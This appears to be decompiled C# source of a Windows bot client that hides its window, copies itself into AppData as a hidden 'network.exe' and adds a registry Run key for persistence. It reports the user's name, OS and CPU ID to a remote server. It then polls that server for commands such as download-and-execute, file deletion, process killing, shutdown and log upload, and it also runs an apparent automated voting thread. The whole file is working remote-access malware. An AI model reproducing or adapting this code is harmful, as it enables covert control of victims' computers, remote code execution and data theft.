using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using MyVT;
using network.My;

namespace network;

[DesignerGenerated]
internal class Main : Form
{
	private IContainer components;

	internal const bool Debug = false;

	internal const string WebSite = "http://boti.astria-serv.com/";

	internal const string FileNameLogs = "Appli_Logs.txt";

	private Thread ThVote;

	private Thread ThCommand;

	public Main()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		ThVote = new Thread(DoVote);
		ThCommand = new Thread(DoCommand);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Main");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			}
			if (Operators.CompareString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\network.exe", Application.get_ExecutablePath(), false) != 0 && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\network.exe"))
			{
				FileSystem.FileCopy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\network.exe");
				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\network.exe", FileAttributes.Hidden);
			}
			MAJ.CheckMAJ();
			reg_run(Application.get_ProductName(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\network.exe");
			WebClient webClient = new WebClient();
			NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat("http://boti.astria-serv.com/command.php?a=registration&user=", string.Concat(string.Concat(string.Concat(Environment.UserName + "&os=", ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName()), "&region="), RegionInfo.CurrentRegion.NativeName)), "&hwid="), Get_HWID()), (object)"&version="), (object)Application.get_ProductVersion()) }, (string[])null, (Type[])null, (bool[])null, true);
			webClient.Dispose();
			AppDomain.CurrentDomain.AssemblyResolve += LoadDllByResources;
			ThVote.SetApartmentState(ApartmentState.STA);
			ThVote.Start();
			ThCommand.SetApartmentState(ApartmentState.STA);
			ThCommand.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[STAThread]
	internal void DoVote()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		try
		{
			Vote val = new Vote();
			val.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void OnChangeStateIsVoting(object sender, EventArgs e, bool IsVoting)
	{
		Logs.Write("[Appli] IsVoting = " + IsVoting);
	}

	private Assembly LoadDllByResources(object sender, ResolveEventArgs args)
	{
		try
		{
			string name = "network." + new AssemblyName(args.Name).Name + ".dll";
			using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
			byte[] array = new byte[checked((int)(stream.Length - 1L) + 1)];
			stream.Read(array, 0, array.Length);
			return Assembly.Load(array);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Assembly result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[STAThread]
	internal void DoCommand()
	{
		try
		{
			while (true)
			{
				try
				{
					WebClient webClient = new WebClient();
					string text = Conversions.ToString(NewLateBinding.LateGet((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"http://boti.astria-serv.com/command.php?a=getcommand&hwid=", Get_HWID()), (object)"&version="), (object)Application.get_ProductVersion()) }, (string[])null, (Type[])null, (bool[])null));
					string[] array = text.Split(new char[1] { '|' });
					string[] array2 = array;
					foreach (string text2 in array2)
					{
						if (Operators.CompareString(text2, "", false) != 0)
						{
							string[] array3 = text2.Split(new char[1] { '=' });
							switch (array3[1])
							{
							case "DownloadAndExecute":
								Commandes.DownloadAndExecute(array3[2]);
								DeleteCommand(Conversions.ToInteger(array3[0]));
								break;
							case "OpenProgram":
								Commandes.OpenProgram(array3[2]);
								DeleteCommand(Conversions.ToInteger(array3[0]));
								break;
							case "Shutdown":
								Commandes.Shutdown();
								DeleteCommand(Conversions.ToInteger(array3[0]));
								break;
							case "Restart":
								Commandes.Restart();
								DeleteCommand(Conversions.ToInteger(array3[0]));
								break;
							case "DeleteFile":
								Commandes.DeleteFile(array3[2]);
								DeleteCommand(Conversions.ToInteger(array3[0]));
								break;
							case "CloseProcess":
								Commandes.CloseProcess(array3[2]);
								DeleteCommand(Conversions.ToInteger(array3[0]));
								break;
							case "DeleteMe":
								Commandes.DeleteMe();
								DeleteCommand(Conversions.ToInteger(array3[0]));
								break;
							case "MAJ":
								MAJ.CheckMAJ();
								DeleteCommand(Conversions.ToInteger(array3[0]));
								break;
							case "Get_Process":
								WriteData(Commandes.Get_Process());
								DeleteCommand(Conversions.ToInteger(array3[0]));
								break;
							case "Get_Logs":
								ReportLogs();
								DeleteCommand(Conversions.ToInteger(array3[0]));
								break;
							}
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(5000);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	internal void DeleteCommand(int id)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadString("http://boti.astria-serv.com/command.php?a=delcommand&id=" + Conversions.ToString(id));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	internal void WriteData(string data, string action = "datas")
	{
		data = data.Replace("&", "%26");
		HttpWebRequest httpWebRequest = (HttpWebRequest)NewLateBinding.LateGet((object)null, typeof(WebRequest), "Create", new object[1] { Operators.ConcatenateObject((object)string.Concat("http://boti.astria-serv.com/command.php?a=" + action, "&hwid="), Get_HWID()) }, (string[])null, (Type[])null, (bool[])null);
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		string s = "datas=" + data;
		byte[] bytes = uTF8Encoding.GetBytes(s);
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.ContentLength = bytes.Length;
		using (Stream stream = httpWebRequest.GetRequestStream())
		{
			stream.Write(bytes, 0, bytes.Length);
		}
		httpWebRequest.GetResponse();
	}

	internal void ReportLogs()
	{
		string logs = Logs.Logs;
		Logs.Logs = "";
		WriteData(logs, "logs");
	}

	internal void reg_run(string ApplicationName, string ApplicationPath)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
			RegistryKey registryKey2 = registryKey;
			registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey2.SetValue(ApplicationName, ApplicationPath);
			registryKey2 = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	internal void del_reg_run(string ApplicationName)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
			RegistryKey registryKey2 = registryKey;
			registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey2.DeleteValue(ApplicationName);
			registryKey2 = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	internal object Get_HWID()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = instances.GetEnumerator();
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				return ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return "";
	}

	internal object StrToBase64(string Str)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(Str));
	}
}
